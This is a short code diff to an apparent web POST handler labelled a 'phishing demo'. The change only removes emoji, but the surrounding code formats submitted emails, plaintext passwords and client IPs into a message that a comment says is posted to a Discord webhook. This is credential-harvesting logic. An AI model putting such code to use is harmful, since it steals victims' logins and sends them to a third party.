@@ -19,7 +19,7 @@ export const POST: RequestHandler = async ({ request }) => {
 				request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown';
 
 			const message = {
-				content: `🎣 **PHISHING DEMO - Attempt ${attempt || '?'}/3**\n\`\`\`\nEmail: ${email}\nPassword: ${password}\nTime: ${timestamp}\nIP: ${ip}\n\`\`\`${attempt >= 3 ? '\n✅ *Max attempts reached - phishing mode disabled*' : ''}`
+				content: `**PHISHING DEMO - Attempt ${attempt || '?'}/3**\n\`\`\`\nEmail: ${email}\nPassword: ${password}\nTime: ${timestamp}\nIP: ${ip}\n\`\`\`${attempt >= 3 ? '\n*Max attempts reached - phishing mode disabled*' : ''}`
 			};
 
 			// Post to Discord webhook
